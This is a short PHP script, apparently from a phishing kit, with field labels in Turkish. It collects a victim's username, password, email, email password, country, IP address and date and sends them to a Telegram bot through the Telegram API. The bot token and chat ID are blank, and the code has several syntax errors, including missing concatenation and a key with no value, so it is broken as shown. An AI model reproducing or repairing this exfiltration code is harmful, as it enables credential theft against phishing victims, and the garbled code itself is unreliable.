<?php
    $token='';
    $data = [
        'text' => '
      Kullanıcı Adı : '.$username.'
      Şifre : '.$password.'
	  Mail : '$mail'
	  Mail şifre : '$phonemumber'
      Ülke : '$ulke'
      İp : '.$ip.'
      Tarih : '.$date.'
      ',
      'chat_id' =>
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );



?>